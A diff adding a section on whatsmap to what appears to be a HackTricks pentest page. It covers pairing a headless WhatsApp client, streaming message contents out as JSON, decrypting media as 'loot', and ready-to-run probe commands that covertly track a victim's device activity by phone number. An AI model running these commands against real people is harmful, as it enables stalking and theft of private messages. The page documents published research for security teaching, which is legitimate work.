@@ -199,6 +199,71 @@ Notes:
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
+## Reverse-engineered Messaging APIs (WhatsApp multi-device mapping)
+
+Reverse-engineered clients such as [whatsmap](https://github.com/Cfomodz/whatsmap) embed the `whatsmeow` Go library to act as a first-class WhatsApp Web multi-device endpoint. Once paired, operators can collect messages, decrypt attachments, and even infer device usage patterns without ever opening the official client.
+
+### Pair headless clients securely
+1. Build and link the automation client locally:
+
+```bash
+git clone https://github.com/Cfomodz/whatsmap.git
+cd whatsmap
+go build ./cmd/wamapper
+./wamapper -mode qr -db mapper.db
+```
+
+2. The QR code pairing flow provisions identity keys inside `mapper.db`. Anyone copying that SQLite file (or the `store/` directory if you use multiple devices) can replay the session and fully drive the bound WhatsApp account, so keep it on encrypted storage and never expose it through file shares.
+3. Runtime telemetry, RTT measurements, and derived patterns are persisted separately in `rtt_data.db`; stealing it leaks contact metadata, targeting history, and previously inferred states.
+
+### Stream and normalize traffic
+The `whatsmeow.Client` can register event handlers that translate raw protobufs into JSON structures that are easy to forward to HTTP endpoints, message queues, or SIEMs:
+
+```go
+cli.AddEventHandler(func(evt interface{}) {
+    if msg, ok := evt.(*events.Message); ok {
+        record := map[string]any{"from": msg.Info.Sender.String(), "to": msg.Info.Chat.String(), "id": msg.Info.ID, "ts": msg.Info.Timestamp.Unix(), "body": msg.Message.GetConversation()}
+        json.NewEncoder(pipe).Encode(record)
+    }
+})
+```
+
+Because the client maintains the same websocket/TLS session as the browser version, this pattern reliably captures group membership changes, reactions, and history syncs that happen while your automation stack is offline.
+
+### Decrypting WhatsApp media artifacts
+`download-to-file.go` implements the full WhatsApp media key derivation and integrity checking logic, letting you persist encrypted media without reverse engineering the protobuf every time:
+
+1. Pull the media URL, `mediaKey`, HMAC, and size from the incoming message (e.g., `msg.Message.GetImageMessage()`).
+2. Call `GetMediaType` to resolve the correct “info key” and derive IV/cipher/MAC keys via WhatsApp’s HKDF.
+3. `downloadAndDecryptToFile` streams the HTTPS object, strips the trailing MAC, validates `fileEncSHA256`, and AES-CBC decrypts the payload in-place.
+4. The helper automatically re-seeks the file, verifies the cleartext SHA256, and truncates it to the expected length so you can safely hand the descriptor to downstream tooling.
+5. For offline loot, open an `*os.File`, call `client.DownloadToFile(ctx, imageMsg, f)`, and the helper will resume partial downloads and retry failed hosts.
+
+### RTT-based device-state recon
+`wamapper` weaponizes silent reaction probes to map when a victim’s device is awake. In `probe` mode the client sends a reaction to a non-existent message ID, waits for the delivery receipt, and stores the round-trip time:
+
+```bash
+./wamapper -mode probe -target 14155551234 -duration 24h -interval 30s -probe-type reaction
+./wamapper -mode export -target 14155551234 -export-csv data.csv
+python analysis/visualize.py data.csv -o report.png
+```
+
+Typical RTT interpretations (from the Careless Whisper paper) are:
+
+| RTT range | Inference | Notes |
+| --- | --- | --- |
+| <300 ms | App foreground | WhatsApp chat view is open, high-fidelity beaconing |
+| 300–1000 ms | Screen on | Screen is unlocked, app may be backgrounded |
+| 1000–3000 ms | Screen off | Device locked but responsive |
+| >3000 ms or timeout | Doze/offline | Power saving or no data coverage |
+
+Switching `-probe-type` to `presence` subscribes to native presence nodes, but the fake-reaction method is stealthier because it never alerts the target.
+
+### OPSEC
+- Bind `wamapper`’s API/export endpoints to localhost and forward them through SSH if remote operators need access.
+- Treat `mapper.db` and `rtt_data.db` as high-value credentials; rotate them if a host is compromised.
+- Because the Go client auto-reconnects, always stop it cleanly before copying databases or you can corrupt the WAL files.
+
 ## FTP
 
 ### FTP server (python)
@@ -456,5 +521,7 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
+- [whatsmap – WhatsApp Activity Mapper](https://github.com/Cfomodz/whatsmap)
+- [Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users on Mobile Instant Messengers](https://arxiv.org/abs/2411.11194)
 
 {{#include ../banners/hacktricks-training.md}}
